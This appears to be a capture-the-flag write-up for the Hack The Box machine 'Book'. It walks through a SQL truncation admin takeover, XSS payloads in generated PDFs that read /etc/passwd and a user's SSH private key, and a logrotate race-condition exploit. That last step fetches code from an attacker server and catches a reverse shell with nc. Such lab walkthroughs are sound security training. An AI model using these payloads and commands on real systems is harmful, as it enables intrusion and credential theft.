# HTB : BOOK


## Initial Recon

Start the initial recon by using nmap : 

```
sudo nmap -sS -sC -sV 10.10.10.176 > rec_ini
```

![](Pictures/rec_ini.png)

Two ports are open : 

1) ssh port 22 and

2) Port 80 -- Where the httponly flag is not set.

```
sudo nmap -p- -T5 10.10.10.176 > all_ports
```

All ports scan doesn't show anything new.


At the begining we are greeted with a Sign-in Sign-up page : 

![](Pictures/home_page.png)

Since I don't have login credentials, I create an account and login.

![](Pictures/landing_page.png)

Directory bruteforcing the main page I got the following things : 


![](Pictures/dirb1.png)


1) /admin

2) settings.php

3) contacts.php

4) profile.php

5) downloadds.php

6) db.php


Admin account found : 

```
	admin@book.htb
``` 


![](Pictures/admin_htb.png)

Capturing and analysis the request shows that there is a PHPSESSID. However, there is no way to decrypt it and sending the request, gives us a `Nope ` alert.


![](Pictures/captured_req.png)



![](Pictures/captured_response.png)


Therefor, for the account takeover, we need to do sql truncation attack. If we add more character than the character limit, then the character after the given limit will be ignored.


https://resources.infosecinstitute.com/sql-truncation-attack/

Trail multiple spaces after the email id admin@book.htb and user a different admin name for the user.

![](Pictures/registered_admin.png)

The following shows the performing of sql truncation

![](Pictures/sql_truncation.png)


![](Pictures/entere_as_admin.png)


I am able to enter as admin using this method.

Possible LFI in : 

1) /admin/collections.php?type=collections

2) /admin/messages.php?email=a@b.com

Now I have a user account and the admin account. You can upload books as the user and can view the books as the admin.

There I tried to upload a file as the user.

However, before upload the book, in the book title and the author field I entered some path traversals.

![](Pictures/uploading_file.png)


Even in the file to be uploaded I have put some path traversal, to see if they are reflected or not.

I found out that the path traversals are reflected in the author name and book name.

![](Pictures/result.png)

Since, my texts are reflected in the file, and I have scope for an LFI, I looked for LFI via XSS.


I entered something in script tags in the author and book name :

```
<script>alert(1)</script>
```

When I downloaded the file, I found that the whole script tags were not visible.

![](Pictures/xss_found.png)


I used the following link for reference :  

https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

Upon using the following payload : 

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

I found out that the LFI is reflected in the collections pdf :

![](Pictures/exploit_success.png)


This shows, there is an user called reader. Also, the ssh service is running there. We can try to read the ssh private key and login as reader using ssh.

So the payload will be :

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

This gives me the ssh private key : 


![](Pictures/id_rsa.png)

Now copy it and give the permission 700 and use it to login

*make sure to use a pdf to txt converter or open in google chrome*

![](Pictures/user.png)


Logging into ssh as reader gives me access to user.



## Root

Cannot perform sudo -l because it asks for the user password 


After running linpeas and looking into the binaries, I found out that there is a race condition in one the running binaries called the logrotate.

![](Pictures/target_logrotate.png)

Use the following POC for reference.

Transfer the source code of the exploit to the target box.

```
python3 -m http.server

wget http://10.10.14.14:8000/logrotten.c
```

Keep a listener open. Since this is a race condition exploit and this cron job changes the file very quickly, the connection will close in  a few seconds, but there will be enough time for you to cat the root.txt

* Create a directory in the /tmp folder.

* Download and compile the exploit code in that directory
* Then create a payload file containing a reverse shell.
* run the exploit and from another ssh connnection, change the value of the access.log file in the backups folder.


```
./logrotten -p ./payload /home/reader/backups/access.log

echo "bc" > /home/reader/backups/access.log

nc -nlvp 1331
```

As soon as you get the shell `cat /root/root.txt`

![](Pictures/root.png)

